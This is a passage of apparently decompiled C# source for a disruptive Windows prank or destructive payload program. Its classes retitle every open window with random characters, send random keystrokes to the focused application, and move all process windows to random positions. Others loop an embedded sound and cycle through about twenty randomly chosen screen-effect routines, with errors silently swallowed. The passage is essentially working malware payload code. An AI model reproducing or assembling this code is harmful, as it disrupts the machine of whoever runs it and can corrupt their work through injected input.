                char ch = Convert.ToChar(random.Next(0, 6969) + random.Next(0, 6969));
                text += ch.ToString();
              }
              Program.er1.SetWindowText(Program.er1.GetForegroundWindow(), text);
              Program.er1.SetWindowText(process2.Handle, text);
              Program.er1.SetWindowText(mainWindowHandle, text);
              Thread.Sleep(0);
            }
          }
        }
        catch
        {
        }
      }
    }

    private class Type : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        try
        {
          Random random = new Random();
          int num = random.Next(4, 10);
          string keys = "";
          for (int index = 0; index < num; ++index)
          {
            char ch = Convert.ToChar(random.Next(0, 6969) + random.Next(0, 6969));
            keys += ch.ToString();
          }
          SendKeys.SendWait(keys);
          Thread.Sleep(this.random.Next(1000));
        }
        catch
        {
        }
      }
    }

    private class Window : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        Process process1 = new Process();
        foreach (Process process2 in Process.GetProcesses())
        {
          try
          {
            Console.WriteLine("Process Name: {0} ", (object) process2.ProcessName);
            IntPtr mainWindowHandle = process2.MainWindowHandle;
            if (mainWindowHandle != IntPtr.Zero)
            {
              Random random = new Random();
              Program.er1.MoveWindow(Program.er1.GetForegroundWindow(), this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
              Program.er1.MoveWindow(mainWindowHandle, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
              Program.er1.MoveWindow(process2.Handle, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
              Program.er1.MoveWindow(hdc, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
              Thread.Sleep(this.random.Next(0, 30000));
            }
          }
          catch
          {
          }
        }
      }
    }

    private class msg : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        try
        {
          Application.Run((Form) new Form1());
        }
        catch
        {
        }
      }
    }

    private class bb : Program.er1.Drawer
    {
      private SoundPlayer audio;

      public bb()
      {
        this.audio = new SoundPlayer((Stream) Resources.homyak2);
        this.audio.Load();
        this.PlayAudioWithDelay();
      }

      private async void PlayAudioWithDelay()
      {
        await Task.Delay(1000);
        this.audio.PlayLooping();
      }

      public override void Draw(IntPtr hdc)
      {
        Random random = new Random(Guid.NewGuid().GetHashCode());
        Program.er1.GetSomeRandomNumber(1, 21);
      }

      public void StopMusic()
      {
        if (this.audio == null)
          return;
        this.audio.Stop();
      }
    }

    private abstract class Drawer
    {
      public bool running;
      public Random random = new Random();
      public int screenW = Screen.PrimaryScreen.Bounds.Width;
      public int screenH = Screen.PrimaryScreen.Bounds.Height;

      public void Start()
      {
        if (this.running)
          return;
        this.running = true;
        new Thread(new ThreadStart(this.DrawLoop)).Start();
      }

      public void Stop() => this.running = false;

      private void DrawLoop()
      {
        while (this.running)
        {
          IntPtr dc = Program.er1.GetDC(IntPtr.Zero);
          this.Draw(dc);
          Program.er1.ReleaseDC(IntPtr.Zero, dc);
        }
      }

      public void Redraw()
      {
        Program.er1.RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Program.er1.RedrawWindowFlags.Invalidate | Program.er1.RedrawWindowFlags.Erase | Program.er1.RedrawWindowFlags.AllChildren);
      }

      public abstract void Draw(IntPtr hdc);
    }

    [Flags]
    private enum RedrawWindowFlags : uint
    {
      Invalidate = 1,
      InternalPaint = 2,
      Erase = 4,
      Validate = 8,
      NoInternalPaint = 16, // 0x00000010
      NoErase = 32, // 0x00000020
      NoChildren = 64, // 0x00000040
      AllChildren = 128, // 0x00000080
      UpdateNow = 256, // 0x00000100
      EraseNow = 512, // 0x00000200
      Frame = 1024, // 0x00000400
      NoFrame = 2048, // 0x00000800
    }

    private class randomdrawer : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        Random random = new Random(Guid.NewGuid().GetHashCode());
        int someRandomNumber = Program.er1.GetSomeRandomNumber(1, 21);
        Program.er1.Drawer drawer1 = (Program.er1.Drawer) new Program.er1.Drawer1();
        Program.er1.Drawer drawer2 = (Program.er1.Drawer) new Program.er1.Drawer2();
        Program.er1.Drawer drawer3 = (Program.er1.Drawer) new Program.er1.Drawer3();
        Program.er1.Drawer drawer4 = (Program.er1.Drawer) new Program.er1.Drawer4();
        Program.er1.Drawer drawer5 = (Program.er1.Drawer) new Program.er1.Drawer5();
        Program.er1.Drawer drawer6 = (Program.er1.Drawer) new Program.er1.Drawer6();
        Program.er1.Drawer drawer7 = (Program.er1.Drawer) new Program.er1.Drawer7();
        Program.er1.Drawer drawer8 = (Program.er1.Drawer) new Program.er1.Drawer8();
        Program.er1.Drawer drawer9 = (Program.er1.Drawer) new Program.er1.Drawer10();
        Program.er1.Drawer drawer10 = (Program.er1.Drawer) new Program.er1.Drawer11();
        Program.er1.Drawer drawer11 = (Program.er1.Drawer) new Program.er1.Drawer12();
        Program.er1.Drawer drawer12 = (Program.er1.Drawer) new Program.er1.Drawer13();
        Program.er1.Drawer drawer13 = (Program.er1.Drawer) new Program.er1.Drawer14();
        Program.er1.Drawer drawer14 = (Program.er1.Drawer) new Program.er1.Drawer15();
        Program.er1.Drawer drawer15 = (Program.er1.Drawer) new Program.er1.Drawer16();
        Program.er1.Drawer drawer16 = (Program.er1.Drawer) new Program.er1.Drawer17();
        Program.er1.Drawer drawer17 = (Program.er1.Drawer) new Program.er1.Drawer18();
        Program.er1.Drawer drawer18 = (Program.er1.Drawer) new Program.er1.Drawer19();
        Program.er1.Drawer drawer19 = (Program.er1.Drawer) new Program.er1.Drawer20();
        switch (someRandomNumber)
        {
          case 1:
            drawer1.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer1.Stop();
            break;
          case 2:
            drawer2.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer2.Stop();
            break;
          case 3:
            drawer3.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer3.Stop();
            break;
          case 4:
            drawer4.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer4.Stop();
            break;
          case 5:
            drawer5.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer5.Stop();
            break;
          case 6:
            drawer6.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer6.Stop();
            break;
          case 7:
            drawer7.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer7.Stop();
            break;
          case 8:
            drawer8.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer8.Stop();
            break;
          case 10:
            drawer9.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer9.Stop();
            break;
          case 11:
            drawer10.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer10.Stop();
            break;
          case 12:
            drawer11.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer11.Stop();
            break;
          case 13:
            drawer12.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer12.Stop();
            break;
          case 14:
            drawer13.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer13.Stop();
            break;
          case 15:
            drawer14.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer14.Stop();
            break;
          case 16 /*0x10*/:
            drawer15.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer15.Stop();
            break;
          case 17:
            drawer16.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer16.Stop();
            break;
          case 18:
            drawer17.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer17.Stop();
            break;
          case 19:
            drawer18.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer18.Stop();
            break;
          case 20:
            drawer19.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer19.Stop();
            break;
        }
      }
    }

    private class randomdrawer1 : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        Random random = new Random(Guid.NewGuid().GetHashCode());
        int someRandomNumber = Program.er1.GetSomeRandomNumber(1, 21);
        Program.er1.Drawer drawer1 = (Program.er1.Drawer) new Program.er1.Drawer1();
        Program.er1.Drawer drawer2 = (Program.er1.Drawer) new Program.er1.Drawer2();
        Program.er1.Drawer drawer3 = (Program.er1.Drawer) new Program.er1.Drawer3();
        Program.er1.Drawer drawer4 = (Program.er1.Drawer) new Program.er1.Drawer4();
        Program.er1.Drawer drawer5 = (Program.er1.Drawer) new Program.er1.Drawer5();
        Program.er1.Drawer drawer6 = (Program.er1.Drawer) new Program.er1.Drawer6();
        Program.er1.Drawer drawer7 = (Program.er1.Drawer) new Program.er1.Drawer7();
        Program.er1.Drawer drawer8 = (Program.er1.Drawer) new Program.er1.Drawer8();
        Program.er1.Drawer drawer9 = (Program.er1.Drawer) new Program.er1.Drawer10();
        Program.er1.Drawer drawer10 = (Program.er1.Drawer) new Program.er1.Drawer11();
        Program.er1.Drawer drawer11 = (Program.er1.Drawer) new Program.er1.Drawer12();
        Program.er1.Drawer drawer12 = (Program.er1.Drawer) new Program.er1.Drawer13();
        Program.er1.Drawer drawer13 = (Program.er1.Drawer) new Program.er1.Drawer14();
        Program.er1.Drawer drawer14 = (Program.er1.Drawer) new Program.er1.Drawer15();
        Program.er1.Drawer drawer15 = (Program.er1.Drawer) new Program.er1.Drawer16();
        Program.er1.Drawer drawer16 = (Program.er1.Drawer) new Program.er1.Drawer17();
        Program.er1.Drawer drawer17 = (Program.er1.Drawer) new Program.er1.Drawer18();
        Program.er1.Drawer drawer18 = (Program.er1.Drawer) new Program.er1.Drawer19();
        Program.er1.Drawer drawer19 = (Program.er1.Drawer) new Program.er1.Drawer20();
        switch (someRandomNumber)
        {
          case 1:
            drawer19.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer19.Stop();
            break;
          case 2:
            drawer18.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer18.Stop();
            break;
          case 3:
            drawer17.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer17.Stop();
            break;
          case 4:
            drawer16.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer16.Stop();
            break;
          case 5:
            drawer15.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer15.Stop();
            break;
          case 6:
            drawer14.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer14.Stop();
            break;
          case 7:
            drawer13.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer13.Stop();
            break;
          case 8:
            drawer12.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer12.Stop();
            break;
          case 9:
            drawer11.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer11.Stop();
            break;
          case 10:
            drawer10.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer10.Stop();
            break;
          case 11:
            drawer9.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer9.Stop();
            break;
          case 13:
            drawer8.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer8.Stop();
            break;
          case 14:
            drawer7.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer7.Stop();
            break;
          case 15:
            drawer6.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer6.Stop();
            break;
          case 16 /*0x10*/:
            drawer5.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer5.Stop();
            break;
          case 17:
            drawer4.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer4.Stop();
            break;
          case 18:
            drawer3.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer3.Stop();
            break;
          case 19:
            drawer2.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer2.Stop();
            break;
          case 20:
            drawer1.Start();
            Thread.Sleep(this.random.Next(15000));
            drawer1.Stop();
            break;
        }
      }
    }

    public struct _BLENDFUNCTION
    {
      public byte BlendOp;
      public byte BlendFlags;
      public byte SourceConstantAlpha;
      public byte AlphaFormat;
    }

    public struct POINT(int x, int y)
    {
      public int X = x;
      public int Y = y;

      public static implicit operator Point(Program.er1.POINT p) => new Point(p.X, p.Y);

      public static implicit operator Program.er1.POINT(Point p) => new Program.er1.POINT(p.X, p.Y);
    }

    public enum TernaryRasterOperations
    {
      BLACKNESS = 66, // 0x00000042
      NOTSRCERASE = 1114278, // 0x001100A6
      NOTSRCCOPY = 3342344, // 0x00330008
      SRCERASE = 4457256, // 0x00440328
      DSTINVERT = 5570569, // 0x00550009
      PATINVERT = 5898313, // 0x005A0049
      SRCINVERT = 6684742, // 0x00660046
      SRCAND = 8913094, // 0x008800C6
      MERGEPAINT = 12255782, // 0x00BB0226
      MERGECOPY = 12583114, // 0x00C000CA
      SRCCOPY = 13369376, // 0x00CC0020
      SRCPAINT = 15597702, // 0x00EE0086
      PATCOPY = 15728673, // 0x00F00021
      PATPAINT = 16452105, // 0x00FB0A09
      WHITENESS = 16711778, // 0x00FF0062
    }
  }
}
